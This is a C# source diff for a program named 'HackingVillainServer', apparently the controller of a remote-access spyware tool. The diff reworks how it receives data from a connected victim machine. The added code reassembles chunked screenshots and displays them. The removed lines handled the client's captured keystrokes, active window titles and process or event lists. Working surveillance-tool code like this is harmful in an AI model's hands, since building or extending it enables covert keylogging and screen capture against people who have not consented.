@@ -10,6 +10,7 @@ using System.IO;
 using System.Windows.Forms;
 using AwesomeSockets.Domain.Sockets;
 using AwesomeSockets.Sockets;
+using NetworkData;
 
 using Buffer = AwesomeSockets.Buffers.Buffer;
 
@@ -62,39 +63,45 @@ namespace HackingVillainServer
 
         Buffer next;
         ScreenViewer viewer;
+        Dictionary<int, List<Data>> _dataBuffer = new Dictionary<int, List<Data>>();
+
         public void Listen()
         {
             Buffer inBuf = Buffer.New();
-            if (!_readyForSize && _readyForScreen)
-            {
-                AweSock.ReceiveMessage(_clients[0].Socket, next);
-                Buffer.FinalizeBuffer(next);
-            }
+            AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
+            Buffer.FinalizeBuffer(inBuf);
+            var data = Data.Deserialize(Buffer.GetBuffer(inBuf));
+            if (_dataBuffer.ContainsKey(data.DataType))
+                _dataBuffer[data.DataType].Add(data);
             else
-            {
-                AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
-                Buffer.FinalizeBuffer(inBuf);
-            }
+                _dataBuffer.Add(data.DataType, new List<Data>() { data });
 
-            if (_readyForProcess)
+            if (!data.IsSplited || data.MaxIndex == data.CurrentIndex)
             {
-                var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
+                Got(data.DataType);
+            }
+            Thread.Sleep(10);
+            /*
+            byte[] bytes = Buffer.GetBuffer(inBuf);
+            using (MemoryStream ms = new MemoryStream(bytes))
+            {
+                var img = Image.FromStream(ms);
+                this.BackgroundImage = img;
+            }
+            */
+        }
 
-                _readyForProcess = false;
-                EventViewer viewer = new EventViewer(k.Split('\n').ToList());
-                this.Invoke((MethodInvoker)delegate ()
-                {
-                    viewer.Show();
-                });
-            }
-            else if (_readyForScreen && _readyForSize)
+        public void Got(int type)
+        {
+            Got(Data.Combine(_dataBuffer[type]), type);
+            _dataBuffer[type].Clear();
+        }
+
+        public void Got(byte[] bytes, int type)
+        {
+            if (type == 7)
             {
-                _readyForSize = false;
-                next = Buffer.New(Buffer.Get<int>(inBuf));
-            }
-            else if (_readyForScreen && !_readyForSize)
-            {
-                using (var ms = new MemoryStream(Buffer.GetBuffer(next)))
+                using (var ms = new MemoryStream(bytes))
                 {
                     var img = Image.FromStream(ms);
                     if (viewer != null)
@@ -108,8 +115,6 @@ namespace HackingVillainServer
                             this.Invoke(new MethodInvoker(() =>
                             {
                                 Send("Stop Showing");
-                                _readyForSize = false;
-                                _readyForScreen = false;
                             }));
                         };
 
@@ -118,29 +123,8 @@ namespace HackingVillainServer
                             viewer.Show();
                         });
                     }
-                    _readyForSize = true;
                 }
             }
-            else if (_readyForWindow)
-            {
-                _readyForWindow = false;
-                _clients[0].CurrentWindow = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
-            }
-            else
-            {
-                var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
-
-                _clients[0].KeyEvents.Add(k);
-            }
-            Thread.Sleep(10);
-            /*
-            byte[] bytes = Buffer.GetBuffer(inBuf);
-            using (MemoryStream ms = new MemoryStream(bytes))
-            {
-                var img = Image.FromStream(ms);
-                this.BackgroundImage = img;
-            }
-            */
         }
 
         public void Send(string msg)
